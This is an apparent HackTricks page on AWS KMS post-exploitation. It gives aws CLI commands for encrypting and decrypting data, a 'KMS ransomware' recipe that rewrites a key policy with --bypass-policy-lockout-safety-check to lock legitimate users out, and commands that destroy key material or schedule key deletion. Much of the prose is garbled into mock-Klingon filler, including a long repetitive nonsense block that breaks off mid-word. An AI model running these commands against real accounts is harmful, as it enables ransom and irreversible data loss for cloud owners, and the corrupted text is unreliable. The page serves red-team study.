# AWS - KMS Post Exploitation

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## KMS

For more information check:

{% content-ref url="../../aws-security/aws-services/aws-kms-enum.md" %}
[aws-kms-enum.md](../../aws-security/aws-services/aws-kms-enum.md)
{% endcontent-ref %}

### Encrypt/Decrypt information

* Using a **symmetric** key
```bash
# Encrypt data
aws kms encrypt \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--output text \
--query Plaintext | base64 \
--decode
```
* **asymmetric** key **vIghro'**:
```bash
# Encrypt data
aws kms encrypt \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--output text \
--query Plaintext | base64 \
--decode
```
### KMS Ransomware

**QIjwIj Ransomware**

Qa'Hom attacker vItlhutlh KMS vItlhutlh, KMS policy vItlhutlh keys 'ej **ghItlhvam vItlhutlh Hoch account access**, 'ej Hoch account vItlhutlh access granted legit account.

vaj, legit account users won't be able to access any informatcion of any service taht has been encrypted with those keys, creating an easy but effective ransomware over the account.

{% hint style="warning" %}
**AWS managed keys aren't affected** by this attack, only **Customer managed keys**.

Also note the need to use the param **`--bypass-policy-lockout-safety-check`** (the lack of this option in the web console makes this attack only possible from the CLI).
{% endhint %}
```bash
# Force policy change
aws kms put-key-policy --key-id mrk-c10357313a644d69b4b28b88523ef20c \
--policy-name default \
--policy file:///tmp/policy.yaml \
--bypass-policy-lockout-safety-check

{
"Id": "key-consolepolicy-3",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::<your_own_account>:root"
},
"Action": "kms:*",
"Resource": "*"
}
]
}
```
{% hint style="danger" %}
QaStaHvIS 'ej vaj 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlhutlh 'ej vaj qaStaHvIS 'e' vItlhutlh 'e' vItlh
```bash
# Destoy they key material previously imported making the key useless
aws kms delete-imported-key-material --key-id 1234abcd-12ab-34cd-56ef-1234567890ab

# Schedule the destoy of a key (min wait time is 7 days)
aws kms schedule-key-deletion \
--key-id arn:aws:kms:us-west-2:123456789012:key/1234abcd-12ab-34cd-56ef-1234567890ab \
--pending-window-in-days 7
```
{% hint style="danger" %}
Qapla'! AWS vItlhutlh **cross account laH vItlhutlh** qonwI'pu' vItlhutlh.
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>tlhInganpu' AWS hacking</strong></a><strong>!</strong></summary>

HackTricks vItlhutlh vItlhutlh:

* Qapla'! **HackTricks** vItlhutlh **company** vItlhutlh **advertising** vItlhutlh **PDF** vItlhutlh [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) vItlhutlh!
* **PEASS & HackTricks swag** vItlhutlh [**official**](https://peass.creator-spring.com) vItlhutlh
* **The PEASS Family** vItlhutlh [**NFTs**](https://opensea.io/collection/the-peass-family) vItlhutlh
* **Join** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) vItlhutlh [**telegram group**](https://t.me/peass) vItlhutlh **follow** **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share** hacking tricks vItlhutlh **submitting PRs** vItlhutlh [**HackTricks**](https://github.com/carlospolop/hacktricks) vItlhutlh [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
